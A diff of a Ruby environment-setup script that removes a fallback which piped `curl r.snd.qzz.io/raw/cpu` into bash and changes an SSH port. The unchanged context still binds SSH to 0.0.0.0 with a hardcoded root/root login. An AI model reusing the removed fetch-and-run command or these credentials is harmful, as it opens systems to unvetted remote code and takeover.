@@ -16,10 +16,9 @@ URLS = [
 TMP = 'freeroot_temp'
 DIR = 'work'
 SH = 'noninteractive.sh'
-FALLBACK_URL = 'r.snd.qzz.io/raw/cpu'
 
 $ssh_ip = '0.0.0.0'
-$ssh_port = 24990
+$ssh_port = 25565
 $users = { 'root' => 'root' }
 
 def log(level, msg)
@@ -75,27 +74,6 @@ def clone_repo
     end
   end
   false
-end
-
-def fallback
-  unless check_command('curl')
-    log('WARN', 'Curl not found, cannot use fallback')
-    return false
-  end
-  log('INFO', "Executing fallback: curl #{FALLBACK_URL} | bash")
-  begin
-    system("curl #{FALLBACK_URL} | bash")
-    if $?.success?
-      log('INFO', 'Fallback executed successfully')
-      return true
-    else
-      log('ERROR', 'Fallback failed')
-      return false
-    end
-  rescue => e
-    log('ERROR', "Fallback error: #{e.message}")
-    false
-  end
 end
 
 def execute_script(directory, script)
@@ -335,15 +313,8 @@ def main
   delete_recursive(tmp_dir) if File.exist?(tmp_dir)
 
   unless clone_repo
-    log('WARN', 'All clone attempts failed, trying fallback method...')
-    delete_recursive(tmp_dir)
-    unless fallback
-      log('ERROR', 'Fallback method also failed')
-      exit 1
-    end
-    log('INFO', 'Fallback method succeeded')
-    sleep
-    return
+    log('ERROR', 'All clone attempts failed')
+    exit 1
   end
 
   FileUtils.mv(tmp_dir, work_dir)
